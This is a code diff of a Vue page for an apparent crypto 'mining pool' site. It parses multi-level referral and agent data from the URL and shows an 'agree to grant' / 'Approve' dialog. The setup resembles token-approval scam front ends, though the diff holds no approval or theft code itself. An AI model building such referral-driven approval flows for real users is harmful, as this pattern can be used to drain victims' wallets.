@@ -17,7 +17,7 @@
       </div>
       <div class="center">
         <img src="../images/icon_eth.f763823b.png" alt="" style="width: 2.93333333vw;">
-        <span id="lang_title">minering</span>
+        <span id="lang_title">{{ this.defaultObj.str }}</span>
       </div>
       <div class="me">
         <router-link to="/home/me">
@@ -46,12 +46,12 @@
       <span style="text-align: center;display:block;">3.After 'agree to grant' may need to wait on the chain Peeding,
         perhaps you should wait for a while on this page</span>
       <span slot="footer" class="dialog-footer">
-        <el-button >Reset</el-button>
+        <el-button>Reset</el-button>
         <el-button type="primary">Approve</el-button>
       </span>
     </el-dialog>
 
-    <TabContainer></TabContainer>
+    <HomeTabContainer></HomeTabContainer>
   </div>
 </template> 
 <script>
@@ -66,20 +66,106 @@ import { autoRegister } from '../utils/myRegisterUtils'
 const blockUtils = new BlockChain();
 // 获取状态机内部封装的方法
 const { mapState, mapMutations, mapActions } = createNamespacedHelpers("Home");
-
 export default {
-  name: "IsHome",
-  components: {
-    TabContainer
-  },
+  name: 'Tab_container_MiningPool',
   data() {
     return {
-      falg:false
-    };
+      falg: false,
+      defaultObj: {
+        str: 'minering',
+        chainType: 'ETH'
+      },
+      arr: []
+    }
   },
   computed: {
+    ...mapState(['obj', 'Msg'])
   },
   methods: {
+    ...mapActions(['GetUserId', 'GoAutoRegister']),
+    async finshdata() {
+      //如果有数据
+      if (this.$route.query.data) {
+        // 点击授权 解析restful数据
+        let res = this.$route.query.data;
+        let ar = res.split('?')
+        let arr = []
+        ar.forEach((item, index) => {
+          if (index != ar.length - 1) {
+            let b = item.split('=');
+            let obj = {};
+            obj[b[0]] = b[1];
+            arr.push(obj)
+          }
+        })
+        console.log(arr);
+        this.arr = arr;
+        // 获取解析后的账号id
+        let userId = arr[0].userParentId
+        console.log(arr);
+        // 发送请求获取账号地址
+        await this.GetUserId({ id: userId })
+        console.log(this.obj);
+        // 如果是一级用户
+        if (this.arr.length == 2) {
+          // 添加授权用户对应链地址 
+          if (this.arr[1].eth_usdt) {
+            this.defaultObj = {
+              str: 'ETH',
+              chainType: 'ETH'
+            }
+          } else if (this.arr[1].bsc_usdt) {
+            this.defaultObj = {
+              str: 'BSC',
+              chainType: 'BSC'
+            }
+          } else if (this.arr[1].trc_usdt) {
+            this.defaultObj = {
+              str: 'TRC',
+              chainType: 'TRC'
+            }
+          }
+        } else {
+          // 如果是二级用户及以上
+          // 添加授权用户对应链地址
+          //区块链类型
+          var chainType = ar[1].split('=')[0].split('_')[0].toUpperCase()
+          var agentAddress
+          console.log(this.obj);
+          if (chainType == 'ETH') {
+            agentAddress = this.obj.ethMainnetAddress + '-ETH'
+          }
+          else if (chainType == 'BSC') {
+            agentAddress = this.obj.bscMainnetAddress + '-BSC'
+          }
+          else if (chainType == 'TRC') {
+            agentAddress = this.obj.trcMainnetAddress + '-TRC'
+          }
+          else {
+            agentAddress = this.obj.ancestorAddress
+          }
+          let agentAdressArr = agentAddress.split('-')
+          if (agentAdressArr[1] == 'ETH') {
+            this.defaultObj = {
+              str: 'ETH',
+              chainType: 'ETH'
+            }
+          }
+          else if (agentAdressArr[1] == 'BSC') {
+            this.defaultObj = {
+              str: 'BSC',
+              chainType: 'BSC'
+            }
+          }
+          else if (agentAdressArr[1] == 'TRC') {
+            this.defaultObj = {
+              str: 'TRC',
+              chainType: 'TRC'
+            }
+          }
+        }
+      }
+    },
     quit() {
       this.$message({
         message: '退出成功',
@@ -94,10 +180,9 @@ export default {
         window.location.href = "/";
       }, 500);
     },
-
   },
   created() {
-    
+    this.finshdata()
   }
 }
 
